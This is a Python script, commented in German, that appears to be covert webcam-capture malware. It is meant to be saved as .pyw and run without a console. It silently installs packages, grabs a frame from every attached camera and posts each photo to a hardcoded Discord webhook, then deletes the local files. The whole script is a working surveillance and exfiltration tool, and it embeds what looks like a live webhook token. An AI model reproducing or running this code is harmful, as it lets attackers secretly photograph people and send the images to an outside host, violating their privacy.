#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# DISCORD CAMERA CAPTURE ‚Äì KEINE ADMIN-RECHTE, KEINE KONSOLE
# Speichern als .pyw und doppelklicken ‚Äì l√§uft unsichtbar

import sys
import subprocess
import importlib.util
import os
import tempfile
import time
from datetime import datetime

# ---------- AUTO-INSTALLATION IM USER-KONTEXT (OHNE ADMIN) ----------
def install_and_import(package, import_name=None):
    if import_name is None:
        import_name = package.replace('-', '_')
    spec = importlib.util.find_spec(import_name)
    if spec is None:
        subprocess.check_call(
            [sys.executable, "-m", "pip", "install", "--quiet", "--user", package],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )

# Ben√∂tigte Pakete ‚Äì werden bei Bedarf im Benutzerverzeichnis installiert
install_and_import("opencv-python", "cv2")
install_and_import("requests")
install_and_import("numpy")

import cv2
import requests
import numpy as np

# ---------- KONFIGURATION ----------
WEBHOOK_URL = "https://discord.com/api/webhooks/1469709535022420152/Fvmuq_82nWlMjj_KSV7mf-QnucQX7JyagCncSNPRnO56_-ywOdwI3hO7YcXJ7rTtapya"

def send_discord_message(text):
    """Sendet eine Textnachricht an den Webhook."""
    try:
        requests.post(WEBHOOK_URL, json={"content": text[:1900]}, timeout=5)
    except:
        pass

def send_discord_photo(filepath):
    """Sendet eine JPEG-Datei als Anhang an den Webhook."""
    try:
        with open(filepath, "rb") as f:
            files = {"file": (os.path.basename(filepath), f, "image/jpeg")}
            requests.post(WEBHOOK_URL, files=files, timeout=10)
    except Exception as e:
        send_discord_message(f"Foto-Fehler: {str(e)[:50]}")

# ---------- HAUPTFUNKTION ----------
def main():
    # Tempor√§res Verzeichnis f√ºr Fotos
    temp_dir = tempfile.mkdtemp(prefix="camcap_")
    success_count = 0
    cam_index = 0
    max_cameras = 10  # Meistens reichen 10 Indizes

    send_discord_message("üì∏ Kamera-Scan gestartet...")

    while cam_index < max_cameras:
        cap = None
        try:
            # DirectShow f√ºr schnellere Initialisierung (keine Admin-Rechte n√∂tig)
            cap = cv2.VideoCapture(cam_index, cv2.CAP_DSHOW)
            if not cap.isOpened():
                cap = cv2.VideoCapture(cam_index)  # Fallback
            if not cap.isOpened():
                cam_index += 1
                continue

            # Kamera warmlaufen lassen
            time.sleep(0.3)
            ret, frame = cap.read()
            if not ret or frame is None:
                cam_index += 1
                continue

            # Bild speichern
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = os.path.join(temp_dir, f"cam_{cam_index}_{timestamp}.jpg")
            cv2.imwrite(filename, frame, [cv2.IMWRITE_JPEG_QUALITY, 85])

            # Pr√ºfen ob Bild g√ºltig
            if os.path.exists(filename) and os.path.getsize(filename) > 1024:
                send_discord_photo(filename)
                success_count += 1
            else:
                send_discord_message(f"‚ö†Ô∏è Kamera {cam_index}: Bild zu klein/fehlerhaft")

            # Aufr√§umen
            try:
                os.remove(filename)
            except:
                pass

        except Exception as e:
            send_discord_message(f"‚ö†Ô∏è Kamera {cam_index}: {str(e)[:50]}")
        finally:
            if cap:
                cap.release()
        cam_index += 1

    # Abschlussmeldung
    send_discord_message(f"‚úÖ {success_count} Foto(s) von {cam_index} Kamera(s) gesendet.")

    # Temp-Verzeichnis l√∂schen
    try:
        import shutil
        shutil.rmtree(temp_dir, ignore_errors=True)
    except:
        pass

if __name__ == "__main__":
    # Wenn das Skript mit pythonw.exe ausgef√ºhrt wird, gibt es keine Konsole
    main()
